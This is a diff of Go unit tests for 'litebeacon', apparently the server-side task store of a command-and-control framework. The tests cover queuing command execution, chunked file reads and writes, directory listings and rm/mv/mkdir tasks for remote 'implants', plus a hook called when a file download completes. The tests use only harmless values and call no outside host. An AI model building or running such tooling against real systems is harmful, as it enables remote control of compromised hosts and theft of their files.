@@ -1,6 +1,7 @@
 package litebeacon
 
 import (
+	"bytes"
 	"testing"
 	"time"
 )
@@ -63,7 +64,7 @@ func TestPushTakeResults(t *testing.T) {
 	s := NewStore()
 	now := time.Now()
 	s.Touch("abc", []byte("n1"), &BeaconInfo{Hostname: "h"}, "", now)
-	s.PushResults("abc", []ExecResult{{TaskID: 1, Exit: 0, Output: []byte("hi")}}, nil, now)
+	s.PushResults("abc", []ExecResult{{TaskID: 1, Exit: 0, Output: []byte("hi")}}, nil, nil, nil, now)
 	results := s.TakeResults("abc")
 	if len(results) != 1 || results[0].Kind != "exec" || string(results[0].Output) != "hi" {
 		t.Fatalf("results: %#v", results)
@@ -79,7 +80,7 @@ func TestResultByteCapEvictsOldest(t *testing.T) {
 	s.Touch("abc", []byte("n1"), nil, "", now)
 	big := make([]byte, maxResultBytes/3)
 	for i := 0; i < 5; i++ {
-		s.PushResults("abc", []ExecResult{{TaskID: uint32(i + 1), Exit: 0, Output: big}}, nil, now)
+		s.PushResults("abc", []ExecResult{{TaskID: uint32(i + 1), Exit: 0, Output: big}}, nil, nil, nil, now)
 	}
 	results := s.TakeResults("abc")
 	if len(results) != 3 {
@@ -135,7 +136,7 @@ func TestIntervalPolicy(t *testing.T) {
 		t.Fatalf("active window should be an exact sleep, sec=%d exact=%v", sec, exact)
 	}
 	// 页面轮询拉结果不算干活，不能把活跃窗口续上
-	s.PushResults("abc", []ExecResult{{TaskID: 1, Output: []byte("x")}}, nil, now)
+	s.PushResults("abc", []ExecResult{{TaskID: 1, Output: []byte("x")}}, nil, nil, nil, now)
 	s.TakeResults("abc")
 	now = now.Add(6 * time.Minute)
 	if got := s.NextInterval("abc"); got != 180 {
@@ -170,5 +171,410 @@ func TestListBeaconsHeartbeat(t *testing.T) {
 	b = s.ListBeacons()[0]
 	if !b.Active || b.IntervalSec != 10 || b.Queued != 1 {
 		t.Fatalf("active list fields: %#v", b)
+	}
+}
+
+func TestFileChunkReassembly(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	queued, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/blob"})
+	if !ok {
+		t.Fatal("queue read")
+	}
+	tasks := s.TakeTasks("abc")
+	if len(tasks) != 1 || tasks[0].Offset != 0 {
+		t.Fatalf("first task: %#v", tasks)
+	}
+
+	first := bytes.Repeat([]byte("A"), fileChunkSize)
+	rest := []byte("tail-bytes")
+	total := uint32(len(first) + len(rest))
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 0, Total: total, Content: first,
+	}}, nil, nil, now)
+	if got := s.TakeResults("abc"); len(got) != 0 {
+		t.Fatalf("partial file should not complete: %#v", got)
+	}
+	cont := s.TakeTasks("abc")
+	if len(cont) != 1 || cont[0].ID != queued.ID || cont[0].Offset != uint32(len(first)) || cont[0].Path != "/tmp/blob" {
+		t.Fatalf("continuation: %#v", cont)
+	}
+
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: uint32(len(first)), Total: total, Content: rest,
+	}}, nil, nil, now)
+	results := s.TakeResults("abc")
+	if len(results) != 1 || results[0].Err != 0 || results[0].Path != "/tmp/blob" {
+		t.Fatalf("complete: %#v", results)
+	}
+	want := append(append([]byte{}, first...), rest...)
+	if !bytes.Equal(results[0].Output, want) {
+		t.Fatalf("reassembled %d bytes, want %d", len(results[0].Output), len(want))
+	}
+}
+
+func TestFileTransferRestartOnMismatch(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	queued, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/blob"})
+	if !ok {
+		t.Fatal("queue read")
+	}
+	_ = s.TakeTasks("abc")
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 0, Total: 100, Content: bytes.Repeat([]byte("A"), 50),
+	}}, nil, nil, now)
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 50, Total: 90, Content: bytes.Repeat([]byte("B"), 40),
+	}}, nil, nil, now)
+	results := s.TakeResults("abc")
+	if len(results) != 1 || results[0].Err != 4 {
+		t.Fatalf("mismatch should abort: %#v", results)
+	}
+	if extra := s.TakeTasks("abc"); len(extra) != 0 {
+		t.Fatalf("failed transfer must not continue: %#v", extra)
+	}
+}
+
+func TestFileTransferRestartOnError(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	queued, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/blob"})
+	if !ok {
+		t.Fatal("queue read")
+	}
+	_ = s.TakeTasks("abc")
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 0, Total: 100, Content: bytes.Repeat([]byte("A"), 50),
+	}}, nil, nil, now)
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Err: 1, Chunked: true,
+	}}, nil, nil, now)
+	results := s.TakeResults("abc")
+	if len(results) != 1 || results[0].Err != 1 || results[0].Path != "/tmp/blob" {
+		t.Fatalf("error should abort: %#v", results)
+	}
+	if extra := s.TakeTasks("abc"); len(extra) != 0 {
+		t.Fatalf("failed transfer must not continue: %#v", extra)
+	}
+}
+
+func TestFileJobCap(t *testing.T) {
+	s := NewStore()
+	s.Touch("abc", []byte("n1"), nil, "", time.Now())
+	for i := 0; i < maxFileJobs; i++ {
+		if _, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/a"}); !ok {
+			t.Fatalf("read %d should queue", i)
+		}
+	}
+	if _, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/b"}); ok {
+		t.Fatal("fifth read should be refused")
+	}
+	if _, ok := s.QueueTask("abc", Task{Type: TaskExec, Cmd: "id"}); !ok {
+		t.Fatal("exec should still queue")
+	}
+}
+
+func TestCompletedFileNotEvictedByExecCap(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	queued, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/blob"})
+	if !ok {
+		t.Fatal("queue read")
+	}
+	_ = s.TakeTasks("abc")
+	body := bytes.Repeat([]byte("Z"), 2<<20)
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 0, Total: uint32(len(body)), Content: body,
+	}}, nil, nil, now)
+	big := make([]byte, maxResultBytes/3)
+	for i := 0; i < 5; i++ {
+		s.PushResults("abc", []ExecResult{{TaskID: uint32(i + 10), Output: big}}, nil, nil, nil, now)
+	}
+	results := s.TakeResults("abc")
+	if len(results) == 0 || results[0].Kind != "read" || len(results[0].Output) != len(body) {
+		t.Fatalf("file result was evicted: %#v", results)
+	}
+}
+
+func TestEmptyFileCompletes(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	queued, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/empty"})
+	if !ok {
+		t.Fatal("queue read")
+	}
+	_ = s.TakeTasks("abc")
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 0, Total: 0,
+	}}, nil, nil, now)
+	results := s.TakeResults("abc")
+	if len(results) != 1 || results[0].Err != 0 || len(results[0].Output) != 0 {
+		t.Fatalf("empty file: %#v", results)
+	}
+}
+
+func TestDirListRequestAndCache(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.nowFn = func() time.Time { return now }
+	s.Touch("abc", []byte("n1"), nil, "", now)
+
+	queued, pending := s.RequestDir("abc", "/etc", false)
+	if !queued || pending {
+		t.Fatalf("first request should queue: queued=%v pending=%v", queued, pending)
+	}
+	tasks := s.TakeTasks("abc")
+	if len(tasks) != 1 || tasks[0].Type != TaskListDir || tasks[0].Path != "/etc" {
+		t.Fatalf("listdir task: %#v", tasks)
+	}
+
+	// 请求在途：同路径不重复入队
+	queued, pending = s.RequestDir("abc", "/etc", false)
+	if queued || !pending {
+		t.Fatalf("in-flight request should dedupe: queued=%v pending=%v", queued, pending)
+	}
+
+	// 结果回来 → 缓存里能查到，pending 清空
+	s.PushResults("abc", nil, nil, []DirResult{{
+		TaskID:  tasks[0].ID,
+		Err:     0,
+		Entries: []DirEntry{{Name: "hosts", Size: 128, ModTime: 1700000000}},
+	}}, nil, now)
+	listing, found, pend := s.DirStatus("abc", "/etc")
+	if !found || pend || listing.Err != 0 || len(listing.Entries) != 1 || listing.Entries[0].Name != "hosts" {
+		t.Fatalf("cached listing: %#v found=%v pend=%v", listing, found, pend)
+	}
+
+	// 缓存新鲜（60s 内）且不强制 → 不再入队
+	queued, pending = s.RequestDir("abc", "/etc", false)
+	if queued || pending {
+		t.Fatalf("fresh cache should serve: queued=%v pending=%v", queued, pending)
+	}
+	// 强制刷新 → 重新入队
+	queued, pending = s.RequestDir("abc", "/etc", true)
+	if !queued || pending {
+		t.Fatalf("force should requeue: queued=%v pending=%v", queued, pending)
+	}
+	tasks = s.TakeTasks("abc")
+	if len(tasks) != 1 || tasks[0].Type != TaskListDir {
+		t.Fatalf("force task: %#v", tasks)
+	}
+
+	// 缓存过期后重新请求
+	now = now.Add(2 * time.Minute)
+	queued, pending = s.RequestDir("abc", "/etc", false)
+	if !queued {
+		t.Fatal("stale cache should requeue")
+	}
+
+	// 错误结果也会落缓存，前端能显示原因
+	tasks = s.TakeTasks("abc")
+	s.PushResults("abc", nil, nil, []DirResult{{TaskID: tasks[0].ID, Err: 2}}, nil, now)
+	listing, found, _ = s.DirStatus("abc", "/etc")
+	if !found || listing.Err != 2 {
+		t.Fatalf("error listing: %#v", listing)
+	}
+
+	// 未知信标
+	if queued, pending := s.RequestDir("missing", "/x", false); queued || pending {
+		t.Fatal("unknown beacon must not queue")
+	}
+	if _, found, _ := s.DirStatus("missing", "/x"); found {
+		t.Fatal("unknown beacon has no cache")
+	}
+}
+
+func TestCompletedFileHook(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	queued, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/x"})
+	if !ok {
+		t.Fatal("queue read")
+	}
+	_ = s.TakeTasks("abc")
+
+	var got struct {
+		beacon string
+		taskID uint32
+		path   string
+		data   []byte
+	}
+	prev := OnCompletedFile
+	OnCompletedFile = func(beaconID string, taskID uint32, path string, data []byte) {
+		got = struct {
+			beacon string
+			taskID uint32
+			path   string
+			data   []byte
+		}{beaconID, taskID, path, data}
+	}
+	defer func() { OnCompletedFile = prev }()
+
+	s.PushResults("abc", nil, []FileResult{{
+		TaskID: queued.ID, Chunked: true, Offset: 0, Total: 5, Content: []byte("hello"),
+	}}, nil, nil, now)
+	if got.beacon != "abc" || got.taskID != queued.ID || got.path != "/tmp/x" || string(got.data) != "hello" {
+		t.Fatalf("hook: %#v", got)
+	}
+
+	// 失败不回调
+	got = struct {
+		beacon string
+		taskID uint32
+		path   string
+		data   []byte
+	}{}
+	queued2, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/y"})
+	if !ok {
+		t.Fatal("queue read 2")
+	}
+	_ = s.TakeTasks("abc")
+	s.PushResults("abc", nil, []FileResult{{TaskID: queued2.ID, Err: 1, Chunked: true}}, nil, nil, now)
+	if got.beacon != "" {
+		t.Fatalf("failed read must not call the hook: %#v", got)
+	}
+}
+
+func TestWriteJobChunkFlow(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.nowFn = func() time.Time { return now }
+	s.Touch("abc", []byte("n1"), nil, "", now)
+
+	body := bytes.Repeat([]byte("W"), fileChunkSize+10) // 需要 2 块
+	queued, ok := s.QueueTask("abc", Task{
+		Type: TaskWrite, Path: "/tmp/a.txt", Data: body, ExpectSize: -1, ExpectMTime: -1, Force: true,
+	})
+	if !ok {
+		t.Fatal("queue write")
+	}
+	if queued.ID == 0 {
+		t.Fatal("job id assigned")
+	}
+	// 第一块已经入队
+	tasks := s.TakeTasks("abc")
+	if len(tasks) != 1 || tasks[0].Type != TaskWrite || tasks[0].Offset != 0 {
+		t.Fatalf("first chunk: %#v", tasks)
+	}
+	if !bytes.Equal(tasks[0].Data, body[:fileChunkSize]) {
+		t.Fatal("first chunk payload")
+	}
+	if tasks[0].Total != uint64(len(body)) {
+		t.Fatalf("total on wire: %d", tasks[0].Total)
+	}
+
+	// ACK 第一块 → 第二块自动入队
+	s.PushResults("abc", nil, nil, nil, []StatusResult{{TaskID: tasks[0].ID, Err: 0}}, now)
+	tasks = s.TakeTasks("abc")
+	if len(tasks) != 1 || tasks[0].Offset != fileChunkSize {
+		t.Fatalf("second chunk: %#v", tasks)
+	}
+	if !bytes.Equal(tasks[0].Data, body[fileChunkSize:]) {
+		t.Fatal("second chunk payload")
+	}
+
+	// ACK 第二块 → 完成，fs 结果进队列
+	s.PushResults("abc", nil, nil, nil, []StatusResult{{TaskID: tasks[0].ID, Err: 0}}, now)
+	results := s.TakeResults("abc")
+	if len(results) != 1 || results[0].Kind != "fs" || results[0].Op != "write" || results[0].Err != 0 || results[0].Path != "/tmp/a.txt" {
+		t.Fatalf("write completion: %#v", results)
+	}
+	// 无残留任务
+	if extra := s.TakeTasks("abc"); len(extra) != 0 {
+		t.Fatalf("leftover tasks: %#v", extra)
+	}
+}
+
+func TestWriteJobAbortsOnError(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	if _, ok := s.QueueTask("abc", Task{Type: TaskWrite, Path: "/tmp/a.txt", Data: []byte("hello"), Force: true}); !ok {
+		t.Fatal("queue write")
+	}
+	tasks := s.TakeTasks("abc")
+	// 写盘失败（如权限）→ abort，不再续块
+	s.PushResults("abc", nil, nil, nil, []StatusResult{{TaskID: tasks[0].ID, Err: 2}}, now)
+	results := s.TakeResults("abc")
+	if len(results) != 1 || results[0].Kind != "fs" || results[0].Err != 2 {
+		t.Fatalf("abort outcome: %#v", results)
+	}
+	if extra := s.TakeTasks("abc"); len(extra) != 0 {
+		t.Fatalf("aborted write must not continue: %#v", extra)
+	}
+}
+
+func TestWriteJobStaleSweep(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.nowFn = func() time.Time { return now }
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	if _, ok := s.QueueTask("abc", Task{Type: TaskWrite, Path: "/tmp/a.txt", Data: []byte("hi"), Force: true}); !ok {
+		t.Fatal("queue write")
+	}
+	_ = s.TakeTasks("abc")
+	// 心跳一直在来，但植入体从不应答 → 超时作废
+	now = now.Add(fsOpTTL + time.Minute)
+	s.PushResults("abc", []ExecResult{{TaskID: 999, Output: []byte("x")}}, nil, nil, nil, now)
+	results := s.TakeResults("abc")
+	found := false
+	for _, r := range results {
+		if r.Kind == "fs" && r.Err == 8 {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("stale write should abort: %#v", results)
+	}
+}
+
+func TestFsSingleOps(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	for _, tc := range []struct {
+		task Task
+		op   string
+	}{
+		{Task{Type: TaskRm, Path: "/tmp/a", Recursive: true}, "rm"},
+		{Task{Type: TaskMv, Path: "/tmp/a", Dst: "/tmp/b"}, "mv"},
+		{Task{Type: TaskMkdir, Path: "/tmp/c"}, "mkdir"},
+	} {
+		if _, ok := s.QueueTask("abc", tc.task); !ok {
+			t.Fatalf("%s queue", tc.op)
+		}
+		tasks := s.TakeTasks("abc")
+		if len(tasks) != 1 {
+			t.Fatalf("%s task: %#v", tc.op, tasks)
+		}
+		s.PushResults("abc", nil, nil, nil, []StatusResult{{TaskID: tasks[0].ID, Err: 0}}, now)
+		results := s.TakeResults("abc")
+		if len(results) != 1 || results[0].Kind != "fs" || results[0].Op != tc.op || results[0].Err != 0 {
+			t.Fatalf("%s outcome: %#v", tc.op, results)
+		}
+	}
+}
+
+func TestTransferCapShared(t *testing.T) {
+	s := NewStore()
+	now := time.Now()
+	s.Touch("abc", []byte("n1"), nil, "", now)
+	for i := 0; i < maxFileJobs; i++ {
+		if _, ok := s.QueueTask("abc", Task{Type: TaskRead, Path: "/tmp/a"}); !ok {
+			t.Fatalf("read %d should queue", i)
+		}
+	}
+	if _, ok := s.QueueTask("abc", Task{Type: TaskWrite, Path: "/tmp/b", Data: []byte("x"), Force: true}); ok {
+		t.Fatal("write should be refused when cap reached")
+	}
+	if _, ok := s.QueueTask("abc", Task{Type: TaskExec, Cmd: "id"}); !ok {
+		t.Fatal("exec still queues")
 	}
 }
